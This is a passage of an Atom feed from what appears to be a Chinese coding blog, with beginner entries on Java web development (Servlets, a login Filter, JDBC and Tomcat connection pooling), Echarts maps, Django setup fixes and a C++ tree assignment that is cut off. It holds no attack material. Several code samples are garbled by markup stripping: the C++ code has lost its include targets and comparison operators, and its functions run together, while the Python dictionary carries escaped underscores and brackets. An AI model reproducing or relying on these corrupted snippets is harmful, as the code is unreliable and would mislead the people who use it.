&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; know =</summary>
      
    
    
    
    <category term="Java" scheme="https://coder.lufer.cc/categories/Java/"/>
    
    
    <category term="Java" scheme="https://coder.lufer.cc/tags/Java/"/>
    
    <category term="后端" scheme="https://coder.lufer.cc/tags/%E5%90%8E%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>从零开始的JavaWeb（四）使用Tomcat JDBC pool优化数据库连接</title>
    <link href="https://coder.lufer.cc/Java/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84JavaWeb%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BD%BF%E7%94%A8Tomcat%20JDBC%20pool%E4%BC%98%E5%8C%96%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5/"/>
    <id>https://coder.lufer.cc/Java/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84JavaWeb%EF%BC%88%E5%9B%9B%EF%BC%89%E4%BD%BF%E7%94%A8Tomcat%20JDBC%20pool%E4%BC%98%E5%8C%96%E6%95%B0%E6%8D%AE%E5%BA%93%E8%BF%9E%E6%8E%A5/</id>
    <published>2018-04-28T13:58:42.000Z</published>
    <updated>2021-04-06T02:03:22.481Z</updated>
    
    <content type="html"><![CDATA[<p>  如果每次对数据库的访问都建立连接，在高并发情况下数据库会拒绝连接：too many connections 如果使用Tomcat JDBC Pool，则由Tomcat对连接池进行维护，对于超出限制的连接可以进行等待，防止连接过多。</p><p>  1.Tomcat配置<br />在项目的WebContent/META-INF下新建context.xml文件进行配置。</p><p>  2.DBConnection类的实现</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DBConnection</span> </span>&#123;</span><br><span class="line"> <span class="keyword">private</span> <span class="keyword">static</span> DataSource ds = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"></span><br><span class="line">            Context initCtx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">                    <span class="comment">//根据元素的name属性值到JNDI容器中检索连接池对象，固定写法</span></span><br><span class="line">            Context envCtx = (Context)initCtx.lookup(<span class="string">&quot;java:comp/env&quot;</span>);</span><br><span class="line">                    <span class="comment">//根据配置中的池名称检索获得连接池</span></span><br><span class="line">            ds = (DataSource) envCtx.lookup(<span class="string">&quot;dbpool&quot;</span>);    </span><br><span class="line">        </span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> ExceptionInInitializerError(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title">getConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">                <span class="comment">//获取连接</span></span><br><span class="line">        <span class="keyword">return</span> ds.getConnection();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">CloseConnection</span><span class="params">(Connection conn)</span> </span>&#123;</span><br><span class="line">                <span class="comment">//归还连接</span></span><br><span class="line">        <span class="keyword">if</span>(conn!=<span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                conn.close();</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  如果每次对数据库的访问都建立连接，在高并发情况下数据库会拒绝连接：too many connections 如果使用Tomcat JDBC Pool，则由Tomcat对连接池进行维护，对于超出限制的连接可以进行等待，防止连接过多。&lt;/p&gt;
&lt;p&gt;  1.Tomcat配置</summary>
      
    
    
    
    <category term="Java" scheme="https://coder.lufer.cc/categories/Java/"/>
    
    
    <category term="Java" scheme="https://coder.lufer.cc/tags/Java/"/>
    
    <category term="后端" scheme="https://coder.lufer.cc/tags/%E5%90%8E%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>从零开始的JavaWeb（三）通过Filter实现登录验证</title>
    <link href="https://coder.lufer.cc/Java/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84JavaWeb%EF%BC%88%E4%B8%89%EF%BC%89%E9%80%9A%E8%BF%87Filter%E5%AE%9E%E7%8E%B0%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81/"/>
    <id>https://coder.lufer.cc/Java/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84JavaWeb%EF%BC%88%E4%B8%89%EF%BC%89%E9%80%9A%E8%BF%87Filter%E5%AE%9E%E7%8E%B0%E7%99%BB%E5%BD%95%E9%AA%8C%E8%AF%81/</id>
    <published>2018-04-20T15:55:03.000Z</published>
    <updated>2021-04-06T02:03:20.223Z</updated>
    
    <content type="html"><![CDATA[<p>  通过Filter验证缓存的session，从而验证当前用户的登录状态。 web.xml中对Filter进行注册。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Filter名字与Class文件映射</span></span><br><span class="line">  loginFilter</span><br><span class="line">  pcadmin.LoginFilter </span><br><span class="line"><span class="comment">//Filter名字与所管辖的网址进行映射</span></span><br><span class="line">  loginFilter</span><br><span class="line">  * </span><br></pre></td></tr></table></figure><p>  写入session可通过如下操作进行。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Sevlet中的request是HTTPRequest，直接可以getSession()</span></span><br><span class="line">HttpSession session=request.getSession();</span><br><span class="line"><span class="comment">//设置session的Key,Value</span></span><br><span class="line">session.setAttribute(<span class="string">&quot;Username&quot;</span>, username);</span><br></pre></td></tr></table></figure><p>  Filter代码。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//Filter中的是SevletRequest，需要先转换为HttpServletRequest才有getSession方法</span></span><br><span class="line">HttpServletRequest httpRequest=(HttpServletRequest)request;</span><br><span class="line">HttpServletResponse httpResponse=(HttpServletResponse)response;</span><br><span class="line">HttpSession session=httpRequest.getSession();</span><br><span class="line"><span class="comment">//获取当前想要请求的url，getRequestURI可以删掉ip域名，仅获取后面的网址，用getRequestURL可获取全部网址</span></span><br><span class="line">String a=httpRequest.getRequestURI();</span><br><span class="line"><span class="comment">//仅拦截html网页请求，这样可以避免拦截js和css等资源文件</span></span><br><span class="line"><span class="keyword">if</span>(a.contains(<span class="string">&quot;.html&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//session不为空，或者本身就要访问login页面，则按原请求放行</span></span><br><span class="line"><span class="keyword">if</span>(session.getAttribute(<span class="string">&quot;Username&quot;</span>)!=<span class="keyword">null</span>||a.contains(<span class="string">&quot;login.html&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">chain.doFilter(request, response);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="comment">//将客户端重定向到login页面</span></span><br><span class="line">&#123;</span><br><span class="line"> httpResponse.sendRedirect(httpRequest.getContextPath()+<span class="string">&quot;/pc/login.html&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="comment">//其他请求放行</span></span><br><span class="line">chain.doFilter(request, response);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  通过Filter验证缓存的session，从而验证当前用户的登录状态。 web.xml中对Filter进行注册。&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span clas</summary>
      
    
    
    
    <category term="Java" scheme="https://coder.lufer.cc/categories/Java/"/>
    
    
    <category term="Java" scheme="https://coder.lufer.cc/tags/Java/"/>
    
    <category term="后端" scheme="https://coder.lufer.cc/tags/%E5%90%8E%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>从零开始的JavaWeb（二）连接SQL数据库</title>
    <link href="https://coder.lufer.cc/Java/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84JavaWeb%EF%BC%88%E4%BA%8C%EF%BC%89%E8%BF%9E%E6%8E%A5SQL%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
    <id>https://coder.lufer.cc/Java/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84JavaWeb%EF%BC%88%E4%BA%8C%EF%BC%89%E8%BF%9E%E6%8E%A5SQL%E6%95%B0%E6%8D%AE%E5%BA%93/</id>
    <published>2018-04-20T15:45:13.000Z</published>
    <updated>2021-04-06T02:03:17.392Z</updated>
    
    <content type="html"><![CDATA[<p>  1、引入sql的jar包</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql-connector-java-5.1.45-bin.jar</span><br></pre></td></tr></table></figure><p>  2、建立连接,注意此处需要catch异常</p><pre class="highlight"><code class="java">Connection connection = <span class="hljs-keyword">null</span>;<span class="hljs-keyword">try</span> &#123;Class.forName(<span class="hljs-string">"com.mysql.jdbc.Driver"</span>);        <span class="hljs-comment">//设置SQL的地址和数据库名</span>        String url = <span class="hljs-string">"jdbc:mysql://127.0.0.1/DataBaseName"</span>;        <span class="hljs-comment">//设置登录用户名的账号和密码</span>        connection = DriverManager.getConnection(url, <span class="hljs-string">"Username"</span>, <span class="hljs-string">"Password"</span>);        <span class="hljs-comment">//字符串写SQL语句</span>        String sql=<span class="hljs-string">"SQL Sentences"</span>;        PreparedStatement preparedStatement = connection.prepareStatement(sql);        <span class="hljs-comment">//preparedStatment有两种方法</span>        <span class="hljs-comment">//executeUpdate执行Insert和Update操作，返回int型数据，为受影响的行数</span>        <span class="hljs-comment">//executeQuery执行各种查询操作，返回ResultSet</span>        <span class="hljs-keyword">int</span> re = preparedStatement.executeUpdate();        <span class="hljs-comment">//SELECT LAST\_INSERT\_ID() 可以获取本次连接最后插入的新行的ID</span>        preparedStatement = connection.prepareStatement(<span class="hljs-string">"SELECT LAST\_INSERT\_ID()"</span>);        ResultSet re2 = preparedStatement.executeQuery();        <span class="hljs-comment">//通过ResultSet.next()方法取下一行</span>        <span class="hljs-keyword">while</span>(re2.next())&#123;        <span class="hljs-comment">//ResultSet有getString,getInt等方法，根据需要的返回值而定，传参可以是字符串，用于按列名查找，也可以是整数，用于按序号查找</span>        String quizid=re2.getString(<span class="hljs-string">"LAST\_INSERT\_ID()"</span>);        <span class="hljs-comment">//关闭连接，否则在大量查询时会被服务器拒绝</span>        connection.close();&#125;<span class="hljs-keyword">catch</span>(ClassNotFoundException e) &#123;        System.out.println(<span class="hljs-string">"Sorry,can`t find the Driver!"</span>);        e.printStackTrace();&#125;<span class="hljs-keyword">catch</span>(SQLException e) &#123;        <span class="hljs-comment">//数据库连接失败异常处理</span>        e.printStackTrace();&#125;<span class="hljs-keyword">catch</span> (Exception e) &#123;        <span class="hljs-comment">// <span class="hljs-doctag">TODO:</span> handle exception</span>        e.printStackTrace();&#125;<span class="hljs-keyword">finally</span>&#123;        System.out.println(<span class="hljs-string">"Operation Finished"</span>);&#125;```</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  1、引入sql的jar包&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;mysql-connector-java-5.1.45-bin.ja</summary>
      
    
    
    
    <category term="Java" scheme="https://coder.lufer.cc/categories/Java/"/>
    
    
    <category term="Java" scheme="https://coder.lufer.cc/tags/Java/"/>
    
    <category term="后端" scheme="https://coder.lufer.cc/tags/%E5%90%8E%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>从零开始的JavaWeb（一）Servlet</title>
    <link href="https://coder.lufer.cc/Java/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84JavaWeb%EF%BC%88%E4%B8%80%EF%BC%89Servlet/"/>
    <id>https://coder.lufer.cc/Java/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84JavaWeb%EF%BC%88%E4%B8%80%EF%BC%89Servlet/</id>
    <published>2018-04-20T15:34:52.000Z</published>
    <updated>2021-04-06T02:03:25.827Z</updated>
    
    <content type="html"><![CDATA[<p>  1、从请求中获取参数</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String username=request.getParameter(<span class="string">&quot;username&quot;</span>);</span><br></pre></td></tr></table></figure><p>  2、设置返回值的格式 对于Json串</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">response.setContentType(<span class="string">&quot;application/json;charset=utf-8&quot;</span>);  </span><br><span class="line">response.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br></pre></td></tr></table></figure><p>  对于纯文本</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">response.setContentType(<span class="string">&quot;application/text;charset=utf-8&quot;</span>);  </span><br><span class="line">response.setCharacterEncoding(<span class="string">&quot;utf-8&quot;</span>);</span><br></pre></td></tr></table></figure><p>  3、输出返回值</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">response.getWriter().print(<span class="string">&quot;success&quot;</span>);</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  1、从请求中获取参数&lt;/p&gt;
&lt;figure class=&quot;highlight java&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;String username=request.getParameter(</summary>
      
    
    
    
    <category term="Java" scheme="https://coder.lufer.cc/categories/Java/"/>
    
    
    <category term="Java" scheme="https://coder.lufer.cc/tags/Java/"/>
    
    <category term="后端" scheme="https://coder.lufer.cc/tags/%E5%90%8E%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>Echarts Map 自定义数据的使用</title>
    <link href="https://coder.lufer.cc/%E5%89%8D%E7%AB%AF/Echarts%20Map%20%E8%87%AA%E5%AE%9A%E4%B9%89%E6%95%B0%E6%8D%AE%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>https://coder.lufer.cc/%E5%89%8D%E7%AB%AF/Echarts%20Map%20%E8%87%AA%E5%AE%9A%E4%B9%89%E6%95%B0%E6%8D%AE%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2018-01-23T11:27:44.000Z</published>
    <updated>2021-04-06T02:18:09.439Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-map中坐标点带自定义数据"><a class="markdownIt-Anchor" href="#1-map中坐标点带自定义数据"></a> 1. Map中坐标点带自定义数据</h1><p>  在坐标点后添加任意数据，构造形如<code>[116.377047322,39.9340718473,1]</code>的Json对，在使用时可以通过监听函数读取<code>data</code>的<code>[2][3]...</code>等字段。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">myChart.on(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">params</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> id = params.data\[<span class="number">2</span>\];</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="2-visualmap与自定义数据的映射"><a class="markdownIt-Anchor" href="#2-visualmap与自定义数据的映射"></a> 2. VisualMap与自定义数据的映射</h1><p>  对于任何自定义数据，例如Map中的Link，无法通过制定Category的方式有效的与VisualMap进行自动映射，只需在数据中添加Value项，VisualMap即可自动识别。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">pathbd.push(</span><br><span class="line">                &#123;</span><br><span class="line">                    coords: cvps,</span><br><span class="line">                    value:data20[i][<span class="number">3</span>],</span><br><span class="line">                    lineStyle: &#123;</span><br><span class="line">                        normal: &#123;</span><br><span class="line">                            opacity: <span class="number">100</span>,</span><br><span class="line">                            width: truewidth</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line"></span><br><span class="line"> visualMap: &#123;</span><br><span class="line">                type: <span class="string">&#x27;piecewise&#x27;</span>,</span><br><span class="line">                left: <span class="string">&#x27;right&#x27;</span>,</span><br><span class="line">                top: <span class="string">&#x27;up&#x27;</span>,</span><br><span class="line">                pieces: [&#123;</span><br><span class="line">                    gt: <span class="number">0</span>,</span><br><span class="line">                    lte: <span class="number">4</span>,</span><br><span class="line">                    color: <span class="string">&#x27;blue&#x27;</span></span><br><span class="line">                &#125;, &#123;</span><br><span class="line">                    gt: <span class="number">4</span>,</span><br><span class="line">                    lte: <span class="number">6</span>,</span><br><span class="line">                    color: <span class="string">&#x27;green&#x27;</span></span><br><span class="line">                &#125;, &#123;</span><br><span class="line">                    gt: <span class="number">6</span>,</span><br><span class="line">                    lte: <span class="number">8</span>,</span><br><span class="line">                    color: <span class="string">&#x27;yellow&#x27;</span></span><br><span class="line">                &#125;, &#123;</span><br><span class="line">                    gt: <span class="number">8</span>,</span><br><span class="line">                    color: <span class="string">&#x27;red&#x27;</span></span><br><span class="line">                &#125;]</span><br><span class="line">            &#125;,</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;1-map中坐标点带自定义数据&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-map中坐标点带自定义数据&quot;&gt;&lt;/a&gt; 1. Map中坐标点带自定义数据&lt;/h1&gt;
&lt;p&gt;  在坐标点后添加任意数据，构造形如&lt;code&gt;[116.377</summary>
      
    
    
    
    <category term="前端" scheme="https://coder.lufer.cc/categories/%E5%89%8D%E7%AB%AF/"/>
    
    
    <category term="前端" scheme="https://coder.lufer.cc/tags/%E5%89%8D%E7%AB%AF/"/>
    
    <category term="Echarts" scheme="https://coder.lufer.cc/tags/Echarts/"/>
    
  </entry>
  
  <entry>
    <title>Django 项目初始化坑</title>
    <link href="https://coder.lufer.cc/%E5%90%8E%E7%AB%AF/Django%20%E9%A1%B9%E7%9B%AE%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%91/"/>
    <id>https://coder.lufer.cc/%E5%90%8E%E7%AB%AF/Django%20%E9%A1%B9%E7%9B%AE%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%91/</id>
    <published>2018-01-19T11:02:48.000Z</published>
    <updated>2021-04-06T02:18:04.745Z</updated>
    
    <content type="html"><![CDATA[<ol><li>PIP的安装</li></ol><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">先安装setup tools</span><br><span class="line">下载：https:&#x2F;&#x2F;pypi.python.org&#x2F;pypi&#x2F;setuptools#windows-simplified</span><br><span class="line">解压后运行 python setup.py install</span><br><span class="line">然后安装pip</span><br><span class="line">下载：http:&#x2F;&#x2F;pypi.python.org&#x2F;pypi&#x2F;pip#downloads</span><br><span class="line">解压后运行 python setup.py install</span><br></pre></td></tr></table></figure><ol start="2"><li>Mysql-Python</li></ol><p>  下载exe安装<br />  <code>http://www.codegood.com/archives/129</code></p><ol start="3"><li>递归报错&quot;RuntimeError: maximum recursion depth exceeded in cmp&quot;</li></ol><p>  找到<code>python\Lib\fuctools.py</code>将</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">convert = &#123;  </span><br><span class="line">    <span class="string">&#x27;\_\_lt\_\_&#x27;</span>: \[(<span class="string">&#x27;\_\_gt\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: other &lt; self),  </span><br><span class="line">               (<span class="string">&#x27;\_\_le\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: <span class="keyword">not</span> other &lt; self),  </span><br><span class="line">               (<span class="string">&#x27;\_\_ge\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: <span class="keyword">not</span> self &lt; other)\],  </span><br><span class="line">    <span class="string">&#x27;\_\_le\_\_&#x27;</span>: \[(<span class="string">&#x27;\_\_ge\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: other &lt;= self),  </span><br><span class="line">               (<span class="string">&#x27;\_\_lt\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: <span class="keyword">not</span> other &lt;= self),  </span><br><span class="line">               (<span class="string">&#x27;\_\_gt\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: <span class="keyword">not</span> self &lt;= other)\],  </span><br><span class="line">    <span class="string">&#x27;\_\_gt\_\_&#x27;</span>: \[(<span class="string">&#x27;\_\_lt\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: other &gt; self),  </span><br><span class="line">               (<span class="string">&#x27;\_\_ge\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: <span class="keyword">not</span> other &gt; self),  </span><br><span class="line">               (<span class="string">&#x27;\_\_le\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: <span class="keyword">not</span> self &gt; other)\],  </span><br><span class="line">    <span class="string">&#x27;\_\_ge\_\_&#x27;</span>: \[(<span class="string">&#x27;\_\_le\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: other &gt;= self),  </span><br><span class="line">               (<span class="string">&#x27;\_\_gt\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: <span class="keyword">not</span> other &gt;= self),  </span><br><span class="line">               (<span class="string">&#x27;\_\_lt\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: <span class="keyword">not</span> self &gt;= other)\]  </span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure><p>替换为</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">convert = &#123;  </span><br><span class="line">    <span class="string">&#x27;\_\_lt\_\_&#x27;</span>: \[(<span class="string">&#x27;\_\_gt\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: <span class="keyword">not</span> (self &lt; other <span class="keyword">or</span> self == other)),  </span><br><span class="line">               (<span class="string">&#x27;\_\_le\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: self &lt; other <span class="keyword">or</span> self == other),  </span><br><span class="line">               (<span class="string">&#x27;\_\_ge\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: <span class="keyword">not</span> self &lt; other)\],  </span><br><span class="line">    <span class="string">&#x27;\_\_le\_\_&#x27;</span>: \[(<span class="string">&#x27;\_\_ge\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: <span class="keyword">not</span> self &lt;= other <span class="keyword">or</span> self == other),  </span><br><span class="line">               (<span class="string">&#x27;\_\_lt\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: self &lt;= other <span class="keyword">and</span> <span class="keyword">not</span> self == other),  </span><br><span class="line">               (<span class="string">&#x27;\_\_gt\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: <span class="keyword">not</span> self &lt;= other)\],  </span><br><span class="line">    <span class="string">&#x27;\_\_gt\_\_&#x27;</span>: \[(<span class="string">&#x27;\_\_lt\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: <span class="keyword">not</span> (self &gt; other <span class="keyword">or</span> self == other)),  </span><br><span class="line">               (<span class="string">&#x27;\_\_ge\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: self &gt; other <span class="keyword">or</span> self == other),  </span><br><span class="line">               (<span class="string">&#x27;\_\_le\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: <span class="keyword">not</span> self &gt; other)\],  </span><br><span class="line">    <span class="string">&#x27;\_\_ge\_\_&#x27;</span>: \[(<span class="string">&#x27;\_\_le\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: (<span class="keyword">not</span> self &gt;= other) <span class="keyword">or</span> self == other),  </span><br><span class="line">               (<span class="string">&#x27;\_\_gt\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: self &gt;= other <span class="keyword">and</span> <span class="keyword">not</span> self == other),  </span><br><span class="line">               (<span class="string">&#x27;\_\_lt\_\_&#x27;</span>, <span class="keyword">lambda</span> self, other: <span class="keyword">not</span> self &gt;= other)\]  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;PIP的安装&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;先安装setup tools&lt;/span&gt;&lt;br&gt;&lt;spa</summary>
      
    
    
    
    <category term="Python" scheme="https://coder.lufer.cc/categories/Python/"/>
    
    
    <category term="后端" scheme="https://coder.lufer.cc/tags/%E5%90%8E%E7%AB%AF/"/>
    
    <category term="Python" scheme="https://coder.lufer.cc/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>C++大作业：异质树的实现</title>
    <link href="https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/C++%E5%A4%A7%E4%BD%9C%E4%B8%9A%EF%BC%9A%E5%BC%82%E8%B4%A8%E6%A0%91%E7%9A%84%E5%AE%9E%E7%8E%B0/"/>
    <id>https://coder.lufer.cc/%E6%97%A5%E5%B8%B8%E6%8A%98%E8%85%BE/C++%E5%A4%A7%E4%BD%9C%E4%B8%9A%EF%BC%9A%E5%BC%82%E8%B4%A8%E6%A0%91%E7%9A%84%E5%AE%9E%E7%8E%B0/</id>
    <published>2017-12-27T16:59:25.000Z</published>
    <updated>2021-04-06T02:17:52.092Z</updated>
    
    <content type="html"><![CDATA[<p>  设计了基类是Person，派生类是Teacher，Student的三个类，并构造一棵树，代码还有点问题在删除节点的时候，删除节点之后子节点如何并到上层节点，当时时间比较紧迫没有细弄就直接全部删除了。</p><figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="meta">#include #include #include #include using namespace std;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title">Person</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span>:</span><br><span class="line">        Person *child\[<span class="number">10</span>\];</span><br><span class="line">        <span class="built_in">int</span> children;</span><br><span class="line">        Person(<span class="built_in">int</span> id,<span class="built_in">string</span> name);</span><br><span class="line">        <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">setjob</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="built_in">string</span> <span class="title">getjob</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">setid</span>(<span class="params"><span class="built_in">int</span> id</span>)</span>;</span><br><span class="line">        <span class="function"><span class="built_in">int</span> <span class="title">getid</span>(<span class="params"></span>)</span>;</span><br><span class="line">        <span class="function"><span class="keyword">void</span> <span class="title">addChild</span>(<span class="params">Person *childPerson</span>)</span>;</span><br><span class="line">        <span class="built_in">int</span> id;</span><br><span class="line">        <span class="built_in">string</span> Job;</span><br><span class="line">        <span class="built_in">string</span> Name;</span><br><span class="line">&#125;;</span><br><span class="line">Person::Person(int id,string name)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">this</span>-&gt;id=id;</span><br><span class="line">    <span class="keyword">this</span>-&gt;Name=name;</span><br><span class="line">    cout&lt;&lt;<span class="string">&quot;Successfully new object,Id is:&quot;</span>&lt;id=id;</span><br><span class="line">&#125;</span><br><span class="line">void Person::setjob()</span><br><span class="line">&#123;</span><br><span class="line">    Job=<span class="string">&quot;Person&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">void Person::addChild(Person* childPerson)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(children==<span class="number">10</span>)</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Error,ChildNum limit exceeded!&quot;</span>&lt;id==id&amp;&amp;root-&gt;Job==job)</span><br><span class="line">    &#123;</span><br><span class="line">        root=NULL;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">int</span> i;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;ichildren;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(root-&gt;child\[i\]-&gt;id==id&amp;&amp;root-&gt;child\[i\]-&gt;Job==job)</span><br><span class="line">            &#123;</span><br><span class="line">                root-&gt;child\[i\]=NULL;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>;ichildren;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">int</span> j=deletehelper(root-&gt;child\[i\],id,job);</span><br><span class="line">            <span class="keyword">if</span>(j==<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">deletePerson</span>(<span class="params">Person* root,<span class="built_in">int</span> id,<span class="built_in">string</span> job</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">int</span> 